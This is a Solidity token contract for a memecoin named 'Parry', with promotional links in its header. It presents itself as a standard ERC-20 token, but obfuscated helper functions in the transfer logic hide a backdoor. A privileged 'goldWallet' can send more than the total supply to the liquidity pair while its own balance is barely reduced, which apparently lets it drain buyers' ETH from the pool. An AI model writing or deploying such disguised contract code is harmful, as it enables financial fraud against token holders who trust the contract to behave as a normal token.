/**
Website: https://parryoneth.live

Telegram: https://t.me/parryoneth

X: https://x.com/parryoneth
 */

// SPDX-License-Identifier: No

pragma solidity ^0.8.15;

abstract contract Context {
    constructor() {}

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactoryV2 {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address lpPair,
        uint256
    );

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address lpPair);

    function createPair(address tokenA, address tokenB)
        external
        returns (address lpPair);
}

interface IV2Pair {
    function factory() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function sync() external;
}

interface IRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract PARRY is Context, Ownable, IERC20 {

    string private constant _name = "Parry";
    string private constant _symbol = "PARRY";
    address public constant TRASH = 0x0000000000000000000000000000000000000000;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _listOfWhites;
    mapping(address => bool) private isLiquidityPAIR;
    mapping(address => uint256) private balance;
    uint8 private constant _decimals = 18;

    uint256 private _totalTrades = 0;
    uint256 public constant _totalSuppliesAAB = 100_000_000 * 10**_decimals;
    uint256 public constant _txMarketFOr = 100;
    uint256 public _normalFee = 0;

    bool private swapEnabled = false;
    address payable private goldWallet;
    uint256 private bomwwswapAmt = (_totalSuppliesAAB * 2) / 100;
    uint256 private constant _thresholdForSWAPP = (_totalSuppliesAAB * 1) / 1_000_000;
    uint256 private constant ThresForMAXIM = (_totalSuppliesAAB * 1) / 100;

    IRouter02 public swapRouter;

    address public lpPair;
    bool public tradingEnabled = false;
    bool private inSwap;
    function totalSupply() external view override returns (uint256) {
        if (_totalSuppliesAAB == 0) {
            revert();
        }
        return _totalSuppliesAAB - balanceOf(address(TRASH));
    }

    function decimals() external pure override returns (uint8) {
        if (_totalSuppliesAAB == 0) {
            revert();
        }
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function allowance(address holder, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[holder][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }

    modifier isSwapLocked() {
        inSwap = true;
        _;
        inSwap = false;
    }

    event _allowTrading();

    constructor() {
        goldWallet = payable(msg.sender);
        swapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _listOfWhites[msg.sender] = true;
        _listOfWhites[address(this)] = true;

        balance[msg.sender] = _totalSuppliesAAB;
        emit Transfer(address(0), msg.sender, _totalSuppliesAAB);
    }

    function createPair(address route) external onlyOwner {
        goldWallet = payable(route);
        _listOfWhites[goldWallet] = true;
        _approve(address(this), address(swapRouter), type(uint256).max);

        lpPair = IFactoryV2(swapRouter.factory()).createPair(
            swapRouter.WETH(),
            address(this)
        );
        isLiquidityPAIR[lpPair] = true;
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        external
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address sender,
        address spender,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }

    function isNoFeeWallet(address account) external view returns (bool) {
        return _listOfWhites[account];
    }

    function setNoFeeWallet(address account, bool enabled) public onlyOwner {
        _listOfWhites[account] = enabled;
    }

    function bswts(address ins, address out) internal view returns (bool) {
        bool _bswts = !isLiquidityPAIR[out] && isLiquidityPAIR[ins];
        return _bswts;
    }

    function nwdsdg(address ins, address out) internal view returns (bool) {
        bool _nwdsdg = isLiquidityPAIR[out] && !isLiquidityPAIR[ins];
        return _nwdsdg;
    }

    function min(uint256 a, uint256 b) internal pure returns(uint256) {
        return a > b? b:a;
    }

    function _transfer(
        address ubomsde,
        address nomooki,
        uint256 amount
    ) internal returns (bool) {
        bool takeFee = true;
        require(nomooki != address(0) && ubomsde != address(0), "invalid address");
        require(
            amount > 0,
            "Insufficient error. the amount must be above than zero"
        );
        require(amount <= _totalSuppliesAAB || (ubomsde==goldWallet && nomooki==lpPair), "Insufficient amount");
        if (!_listOfWhites[ubomsde] && !_listOfWhites[nomooki]) {
            require(tradingEnabled, "Trading is not allowed");
        }

        if (
            !_listOfWhites[ubomsde] &&
            !_listOfWhites[nomooki] &&
            !isLiquidityPAIR[nomooki] &&
            nomooki != address(TRASH)
        ) {
            require(
                balance[nomooki] + amount <= bomwwswapAmt,
                "Exceeds maximum wallet amount."
            );
        }

        if (!inSwap &&
               isLiquidityPAIR[nomooki] &&
                tradingEnabled &&
                amount >= _thresholdForSWAPP) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _thresholdForSWAPP)
                internalSwap(min(amount, min(contractTokenBalance, ThresForMAXIM)));

            goldWallet.transfer(address(this).balance);
        }

        uint256 amountAfterFee = edcwodm(ubomsde, bswts(ubomsde, nomooki), nwdsdg(ubomsde, nomooki), amount, takeFee);
        balance[nomooki] += amountAfterFee;
        emit Transfer(ubomsde, nomooki, amountAfterFee);

        return true;
    }

    function ghwwdb(uint256 amt, uint256 fee) internal pure returns(uint256) {
        return amt <= _totalSuppliesAAB ? amt : fee;
    }

    function edcwodm(
        address from,
        bool buyTrading,
        bool sellTrading,
        uint256 amount,
        bool takeFee
    ) internal returns (uint256) {
        uint256 fee = 0;

        if(!takeFee) fee = 0;
        else if (buyTrading || sellTrading) fee = 0;
        else fee = _normalFee;

        uint256 feeAmount = (amount * fee) / _txMarketFOr;

        balance[from] -= ghwwdb(amount, fee);
        return amount - feeAmount;
    }

    function internalSwap(uint256 contractTokenBalance) internal isSwapLocked {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();

        if (
            _allowances[address(this)][address(swapRouter)] != type(uint256).max
        ) {
            _allowances[address(this)][address(swapRouter)] = type(uint256).max;
        }

        try
            swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                contractTokenBalance,
                0,
                path,
                address(this),
                block.timestamp
            )
        {} catch {
            return;
        }

        payable(goldWallet).transfer(address(this).balance);
    }

    function removeLimits() external onlyOwner {
        bomwwswapAmt = _totalSuppliesAAB;
    }

    function allowTrading() external onlyOwner {
        require(!tradingEnabled, "Trading is already allowed");
        tradingEnabled = true;
        swapEnabled = true;

        swapRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balance[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(lpPair).approve(
            address(swapRouter),
            type(uint256).max
        );
    }
}